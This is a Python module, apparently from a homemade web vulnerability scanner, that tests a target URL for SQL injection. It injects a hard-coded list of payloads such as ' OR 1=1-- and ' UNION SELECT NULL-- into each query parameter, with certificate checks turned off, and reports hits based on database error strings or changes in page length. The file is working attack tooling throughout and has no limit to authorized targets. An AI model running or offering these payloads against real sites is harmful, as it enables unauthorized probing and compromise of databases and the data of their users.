import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from modules.colors import Colors

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "User-Agent": "Mozilla/5.0"
}

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    query[param] = payload

    new_query = urlencode(query, doseq=True)

    new_url = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))

    return new_url


def detect_sql_injection(url, report):

    print(f"\n{Colors.BLUE}[+] Testing for SQL Injection...{Colors.RESET}\n")

    report.write("SQL Injection Test\n")
    report.write("------------------\n")

    # Extended SQL payloads (more realistic)
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR '1'='1'-- -",
        "' OR ''='",
        "' OR 1=1 LIMIT 1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--"
    ]

    # SQL error patterns
    errors = [
        "sql syntax",
        "mysql",
        "syntax error",
        "database error",
        "odbc",
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "pg_query",
        "sqlite error",
        "fatal error",
        "sqlstate"
    ]

    try:
        # Baseline request (important improvement)
        baseline = requests.get(url, headers=headers, timeout=15, verify=False)
        baseline_length = len(baseline.text)

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # If no parameters → test default param
        if not params:
            params = {"id": ["1"]}

        for param in params:

            print(f"{Colors.CYAN}[INFO]{Colors.RESET} Testing parameter: {param}")

            for payload in payloads:

                test_url = inject_payload(url, param, payload)

                print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} {test_url}")

                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                content = response.text.lower()

                # 🔴 1. Error-based detection
                for error in errors:
                    if error in content:
                        print(f"{Colors.RED}[HIGH]{Colors.RESET} SQL Injection (Error-Based)")
                        print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")

                        report.write("HIGH: SQL Injection (Error-Based)\n")
                        report.write(f"Parameter: {param}\n")
                        report.write(f"Payload: {payload}\n\n")
                        return

                # 🟡 2. Response length anomaly detection
                if abs(len(response.text) - baseline_length) > 50:
                    print(f"{Colors.RED}[MEDIUM]{Colors.RESET} Possible SQL Injection (Content Change)")
                    print(f"{Colors.CYAN}Payload: {payload}{Colors.RESET}")

                    report.write("MEDIUM: Possible SQL Injection (Content Change)\n")
                    report.write(f"Parameter: {param}\n")
                    report.write(f"Payload: {payload}\n\n")
                    return

        print(f"{Colors.GREEN}[INFO]{Colors.RESET} No SQL Injection indicators found")
        report.write("INFO: No SQL Injection indicators found\n\n")

    except requests.exceptions.RequestException as e:
        print("SQL test error:", e)
